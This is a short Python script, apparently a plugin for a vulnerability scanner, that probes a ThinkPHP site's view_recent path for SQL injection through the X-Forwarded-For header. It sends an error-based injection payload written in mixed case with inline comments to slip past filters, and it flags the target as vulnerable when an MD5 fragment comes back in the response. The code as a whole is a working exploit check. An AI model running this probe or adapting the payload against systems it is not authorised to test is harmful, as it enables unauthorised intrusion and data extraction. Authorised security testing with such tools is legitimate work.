"""  
@Time: 2024/2/28 16:48 
@Auth: Y5neKO
@File: Thinkphp_view_recent_xff_sqli.py 
@IDE: PyCharm 
"""
import requests
import urllib.parse


def run(url, timeout):
    result = {
        'name': 'Thinkphp_view_recent_xff_sqli',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        "X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
    }
    try:
        vurl = url + '/index.php?s=/home/article/view_recent/name/1'
        req = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
        if "56540676a129760a" in req.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = vurl
            result['parameter'] = 'X-Forwarded-For'
            result['payload'] = headers['X-Forwarded-For']
        return result
    except Exception as e:
        print(e)
        return result
